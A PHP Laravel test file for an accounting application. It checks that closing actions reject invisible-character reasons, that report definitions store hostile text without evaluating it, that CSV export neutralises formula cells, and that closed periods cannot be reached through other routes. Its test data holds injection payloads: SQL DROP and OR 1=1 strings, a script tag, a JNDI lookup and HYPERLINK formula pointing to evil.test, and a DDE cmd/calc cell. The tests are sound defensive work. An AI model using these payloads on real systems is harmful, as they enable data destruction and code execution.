<?php

namespace Tests\Feature\Oa5;

use App\Domain\Identity\Models\Tenant;
use Illuminate\Support\Facades\DB;
use Tests\Support\AccountingFixtures;
use Tests\Support\ClosingFixtures;
use Tests\Support\FixedAssetFixtures;
use Tests\Support\Fixtures;
use Tests\Support\FxFixtures;
use Tests\Support\Oa5Fixtures;
use Tests\Support\PayablesFixtures;
use Tests\Support\ReceivablesFixtures;
use Tests\Support\ReconciliationFixtures;
use Tests\Support\ReportingFixtures;
use Tests\Support\TaxFixtures;
use Tests\TestCase;

/**
 * OA5 verification (spec 71, 82): hostile input. Report definitions take declarative data and never evaluate it; the closing actions cannot be
 * reached around their rules - not through the generic journal and period routes, and not with a reason that looks like one but shows nothing.
 */
class AbuseCasesTest extends TestCase
{
    use AccountingFixtures, ClosingFixtures, FixedAssetFixtures, Fixtures, FxFixtures, Oa5Fixtures, PayablesFixtures, ReceivablesFixtures, ReconciliationFixtures, ReportingFixtures, TaxFixtures;

    private Tenant $tenant;

    protected function setUp(): void
    {
        parent::setUp();
        $this->tenant = $this->oa5Tenant();
        $this->signedIn($this->tenant);
        $this->publishedDefinitions($this->tenant);
        $this->book($this->tenant, '2026-01-10', '1110', '4100', '800000');
        $this->book($this->tenant, '2026-01-20', '6100', '1110', '300000');
        $this->putJson(self::CL.'/closing/policy', ['settings' => ['separate_closer_and_reopener' => false]])->assertOk();
    }

    /** @return list<string> text that shows nothing: separators and control or format characters of several scripts, alone or mixed */
    private function invisibles(): array
    {
        $parts = ["\u{00A0}", "\u{3000}", "\u{200B}", "\u{200C}", "\u{200D}", "\u{2060}", "\u{FEFF}", "\u{00AD}", "\u{180E}", "\u{2800}", "\u{0009}", "\u{202F}"];

        return [...array_map(fn (string $c) => str_repeat($c, 12), $parts), implode('', $parts), " \u{200C}\t\u{2060} \u{3000}\u{200B}\u{00A0}"];
    }

    /** @return array<string,string> table => hash of the closing and audit rows, to prove that a refused action changed nothing */
    private function trail(): array
    {
        return $this->rowHashes($this->tenant, ['closing_events', 'closing_checklist_items', 'year_end_closings', 'accounting_periods', 'journal_entries', 'audit_logs']);
    }

    public function test_a_reason_that_shows_nothing_is_no_reason_for_a_reopen_a_waiver_or_a_year_end_reversal(): void
    {
        $this->postJson(self::CL.'/closing/checklist-templates', ['code' => 'BANK', 'title' => 'Cek mutasi bank', 'required' => false])->assertCreated();
        $year = $this->fiscalYear($this->tenant, 'FY2026')->id;
        $this->postJson(self::CL."/year-end/{$year}/run")->assertCreated();
        $this->hardClose($this->tenant, '2026-01');
        $january = $this->period($this->tenant, '2026-01')->id;
        $february = $this->period($this->tenant, '2026-02')->id;
        $before = $this->trail();

        foreach ($this->invisibles() as $reason) {
            $this->postJson(self::CL."/closing/periods/{$january}/reopen", ['reason' => $reason, 'target' => 'OPEN'])->assertStatus(422);
            $this->postJson(self::CL."/year-end/{$year}/reverse", ['reason' => $reason])->assertStatus(422);
            $this->postJson(self::CL."/closing/periods/{$february}/checklist/BANK/waive", ['reason' => $reason])->assertStatus(422);
        }
        $this->assertSame($before, $this->trail(), 'nothing changed, nothing was written to the history or the audit trail');
        $this->assertSame('CLOSED', $this->periodStatus($this->tenant, '2026-01'));

        // Control: the same requests with a real reason go through, so it was the reason that stopped the others.
        $this->postJson(self::CL."/closing/periods/{$january}/checklist/BANK/waive", ['reason' => 'Tidak ada mutasi bank'])->assertStatus(409)->assertJsonPath('code', 'CHECKLIST_PERIOD_CLOSED');
        $this->postJson(self::CL."/year-end/{$year}/reverse", ['reason' => 'Koreksi klasifikasi pendapatan'])->assertOk();
        $this->postJson(self::CL."/closing/periods/{$january}/reopen", ['reason' => 'Koreksi pencatatan Januari', 'target' => 'OPEN'])->assertOk();
    }

    public function test_a_definition_is_data_text_is_shown_back_verbatim_and_neutralised_in_csv_and_nothing_is_evaluated(): void
    {
        $accounts = DB::table('accounts')->where('tenant_id', $this->tenant->id)->count();
        $draft = $this->postJson(self::RP.'/report-definitions', ['statement_type' => 'PROFIT_LOSS', 'name' => '=HYPERLINK("http://evil.test","x")'])->assertCreated()->json('id');
        $evil = ["'; DROP TABLE accounts; --", '<script>alert(1)</script>', '{{7*7}} ${jndi:ldap://evil.test/a}', '=1+1', '@SUM(1+1)*cmd|\' /C calc\'!A0', "Robert'); DELETE FROM journal_entries;--"];
        $this->putJson(self::RP."/report-definitions/{$draft}/lines", ['lines' => [
            ['code' => 'REV', 'label' => $evil[0], 'line_type' => 'ACCOUNT_GROUP', 'balance_side' => 'CREDIT', 'notes' => $evil[1]],
            ['code' => 'EXP', 'label' => $evil[2], 'line_type' => 'ACCOUNT_GROUP', 'balance_side' => 'DEBIT', 'notes' => $evil[3]],
            ['code' => 'RES', 'label' => $evil[4], 'line_type' => 'CALCULATED_TOTAL', 'operands' => [['line' => 'REV', 'sign' => '+'], ['line' => 'EXP', 'sign' => '-']], 'notes' => $evil[5]],
        ]])->assertOk();
        $this->putJson(self::RP."/report-definitions/{$draft}/mappings", ['mappings' => [
            ['line_code' => 'REV', 'account_id' => $this->account($this->tenant, '4100')->id], ['line_code' => 'EXP', 'account_id' => $this->account($this->tenant, '6100')->id],
        ]])->assertOk();

        $validation = $this->postJson(self::RP."/report-definitions/{$draft}/validate")->assertOk()->json();
        $this->assertTrue($validation['valid'], json_encode($validation['errors']));
        $stored = $this->getJson(self::RP."/report-definitions/{$draft}")->assertOk()->json();
        $this->assertSame($evil[0], collect($stored['lines'])->firstWhere('code', 'REV')['label'], 'stored and returned as plain text');

        // The statement computes from the ledger, not from the text: 800000 revenue, 300000 expense.
        $statement = $this->statement('profit-loss', ['from' => '2026-01-01', 'to' => '2026-01-31', 'definition_id' => $draft]);
        $this->assertSame('500000.0000', $statement['integrity']['ledger_result']);
        $this->assertSame('500000.0000', collect($statement['lines'])->firstWhere('code', 'RES')['amount']);
        $csv = $this->get(self::RP.'/reports/profit-loss/export?'.http_build_query(['from' => '2026-01-01', 'to' => '2026-01-31', 'definition_id' => $draft]))->assertOk()->streamedContent();
        foreach ($this->csvRows($csv) as $row) {
            foreach ($row as $cell) {
                $this->assertDoesNotMatchRegularExpression('/^[=+@\t\r]/', $cell, "a spreadsheet would run the cell: {$cell}");
            }
        }
        $this->assertStringContainsString("'@SUM(1+1)", $csv, 'the cell that starts like a formula is prefixed, not dropped');

        $this->assertSame($accounts, DB::table('accounts')->where('tenant_id', $this->tenant->id)->count());
        $this->assertSame(2, DB::table('journal_entries')->where('tenant_id', $this->tenant->id)->where('status', 'POSTED')->count(), 'the ledger is untouched');
    }

    public function test_unsafe_operands_and_mappings_are_refused_or_reported_and_a_refused_mapping_saves_nothing(): void
    {
        $draft = $this->postJson(self::RP.'/report-definitions', ['statement_type' => 'PROFIT_LOSS', 'name' => 'Uji operand'])->assertCreated()->json('id');
        $line = fn (string $code, array $operands = []) => ['code' => $code, 'label' => $code, 'line_type' => 'CALCULATED_TOTAL', 'operands' => $operands];

        // Formulas are not accepted anywhere: the sign is + or -, the operand is the code of another line.
        foreach (['*', '+1/0', 'eval', '', '++', ['+']] as $sign) {
            $this->putJson(self::RP."/report-definitions/{$draft}/lines", ['lines' => [$line('A', [['line' => 'B', 'sign' => $sign]])]])->assertStatus(422);
        }
        $this->putJson(self::RP."/report-definitions/{$draft}/lines", ['lines' => [['code' => 'A;B', 'label' => 'x', 'line_type' => 'HEADER']]])->assertStatus(422);
        $this->putJson(self::RP."/report-definitions/{$draft}/lines", ['lines' => [['code' => 'A', 'label' => 'x', 'line_type' => 'FORMULA', 'operands' => []]]])->assertStatus(422);

        // What the shape allows but the logic does not: unknown operand, self reference, a cycle. Saved as a draft, reported, and never published.
        $cases = [
            'OPERAND_LINE_MISSING' => [$line('A', [['line' => 'REV*2', 'sign' => '+']])],
            'OPERAND_SELF_REFERENCE' => [$line('A', [['line' => 'A', 'sign' => '+']])],
            'CALCULATION_CYCLE' => [$line('A', [['line' => 'B', 'sign' => '+']]), $line('B', [['line' => 'A', 'sign' => '-']])],
        ];
        foreach ($cases as $code => $lines) {
            $this->putJson(self::RP."/report-definitions/{$draft}/lines", ['lines' => $lines])->assertOk();
            $report = $this->postJson(self::RP."/report-definitions/{$draft}/validate")->assertOk()->json();
            $this->assertFalse($report['valid'], $code);
            $this->assertContains($code, array_column($report['errors'], 'code'));
            $this->postJson(self::RP."/report-definitions/{$draft}/publish", ['effective_from' => '2026-02-01'])->assertStatus(422);
            $this->assertSame('DRAFT', DB::table('report_definitions')->where('id', $draft)->value('status'));
            $this->getJson(self::RP.'/reports/profit-loss?'.http_build_query(['from' => '2026-01-01', 'to' => '2026-01-31', 'definition_id' => $draft]))->assertStatus(422);
        }

        // Mappings: all or nothing.
        $this->putJson(self::RP."/report-definitions/{$draft}/lines", ['lines' => [
            ['code' => 'REV', 'label' => 'Pendapatan', 'line_type' => 'ACCOUNT_GROUP', 'balance_side' => 'CREDIT'], ['code' => 'EXP', 'label' => 'Beban', 'line_type' => 'ACCOUNT_GROUP', 'balance_side' => 'DEBIT'],
            ['code' => 'HDR', 'label' => 'Judul', 'line_type' => 'HEADER'],
        ]])->assertOk();
        $this->putJson(self::RP."/report-definitions/{$draft}/mappings", ['mappings' => [['line_code' => 'REV', 'account_id' => $this->account($this->tenant, '4100')->id]]])->assertOk();
        $mappings = fn () => md5(DB::table('report_line_mappings')->where('tenant_id', $this->tenant->id)->orderBy('id')->get()->toJson());
        $saved = $mappings();
        $revenue = $this->account($this->tenant, '4100')->id;
        $expense = $this->account($this->tenant, '6100')->id;
        $cash = $this->account($this->tenant, '1110')->id;
        $attempts = [
            'sql in the account id' => [['line_code' => 'EXP', 'account_id' => "' OR 1=1 --"]],
            'array as account id' => [['line_code' => 'EXP', 'account_id' => [$expense]]],
            'unknown line' => [['line_code' => 'NOPE', 'account_id' => $expense]],
            'line code with an expression' => [['line_code' => 'EXP;DROP', 'account_id' => $expense]],
            'a heading cannot be mapped' => [['line_code' => 'HDR', 'account_id' => $expense]],
            'the same account on two lines' => [['line_code' => 'REV', 'account_id' => $revenue], ['line_code' => 'EXP', 'account_id' => $revenue]],
            'an account type the statement does not use' => [['line_code' => 'REV', 'account_id' => $revenue], ['line_code' => 'EXP', 'account_id' => $cash]],
            'a valid mapping next to an invalid one' => [['line_code' => 'EXP', 'account_id' => $expense], ['line_code' => 'NOPE', 'account_id' => $expense]],
        ];
        foreach ($attempts as $label => $mapping) {
            $this->assertContains($this->putJson(self::RP."/report-definitions/{$draft}/mappings", ['mappings' => $mapping])->getStatusCode(), [404, 422], $label);
            $this->assertSame($saved, $mappings(), "{$label}: nothing was saved");
        }
    }

    public function test_a_closed_period_stays_closed_to_the_generic_journal_and_period_routes(): void
    {
        $january = $this->period($this->tenant, '2026-01')->id;
        $draft = $this->draft($this->tenant, ['document_date' => '2026-02-05', 'posting_date' => '2026-02-05', 'description' => 'Jurnal Februari']);
        $feb = $this->draft($this->tenant, ['document_date' => '2026-02-06', 'posting_date' => '2026-02-06', 'description' => 'Jurnal Februari kedua']);
        $this->hardClose($this->tenant, '2026-01');
        $posted = fn () => DB::table('journal_entries')->where('tenant_id', $this->tenant->id)->where('status', 'POSTED')->whereBetween('posting_date', ['2026-01-01', '2026-01-31'])->count();
        $count = $posted();

        // A draft can be edited (nothing is posted yet) but no journal dated in the closed period can be posted, whichever road it takes.
        $this->patchJson('/api/v1/app/accounting/journals/'.$draft['id'], ['posting_date' => '2026-01-15', 'document_date' => '2026-01-15']);
        $new = $this->postJson('/api/v1/app/accounting/journals', $this->journalBody($this->tenant, ['document_date' => '2026-01-15', 'posting_date' => '2026-01-15']));
        $ids = array_filter([$draft['id'], $new->getStatusCode() === 201 ? $new->json('id') : null]);
        $this->assertNotEmpty($ids);
        foreach ($ids as $id) {
            $this->assertSame('2026-01-15', substr((string) DB::table('journal_entries')->where('id', $id)->value('posting_date'), 0, 10));
            $this->postJson("/api/v1/app/accounting/journals/{$id}/submit")->assertStatus(422)->assertJsonPath('code', 'PERIOD_CLOSED');
            $this->postJson("/api/v1/app/accounting/journals/{$id}/approve")->assertStatus(409);
            $this->assertGreaterThanOrEqual(400, $this->postJson("/api/v1/app/accounting/journals/{$id}/post")->getStatusCode());
            $this->assertNotSame('POSTED', DB::table('journal_entries')->where('id', $id)->value('status'));
        }
        $this->assertSame($count, $posted(), 'no journal reached the closed period');

        // The legacy period routes cannot reopen it or step it back, and there is no route that edits a period.
        $this->postJson("/api/v1/app/accounting/periods/{$january}/open")->assertStatus(409);
        $this->postJson("/api/v1/app/accounting/periods/{$january}/soft-close")->assertStatus(409);
        foreach ([$this->patchJson("/api/v1/app/accounting/periods/{$january}", ['status' => 'OPEN']), $this->putJson("/api/v1/app/accounting/periods/{$january}", ['status' => 'OPEN']), $this->deleteJson("/api/v1/app/accounting/periods/{$january}")] as $response) {
            $this->assertContains($response->getStatusCode(), [404, 405]);
        }
        $this->assertSame('CLOSED', $this->periodStatus($this->tenant, '2026-01'));

        // A soft-closed period takes a posting only from a person who holds the privilege, and not from the one who does not.
        $this->postJson(self::CL.'/closing/periods/'.$this->period($this->tenant, '2026-02')->id.'/soft-close', ['reason' => 'Mulai penutupan Februari'])->assertOk();
        $this->postJson("/api/v1/app/accounting/journals/{$feb['id']}/submit")->assertOk();
        $this->postJson("/api/v1/app/accounting/journals/{$feb['id']}/approve")->assertOk();
        $plain = $this->memberToken($this->tenant, ['accounting.journal.view', 'accounting.journal.post']);
        $this->as($plain)->postJson("/api/v1/app/accounting/journals/{$feb['id']}/post")->assertStatus(422)->assertJsonPath('code', 'PERIOD_SOFT_CLOSED');
        $this->assertSame('APPROVED', DB::table('journal_entries')->where('id', $feb['id'])->value('status'));
    }
}
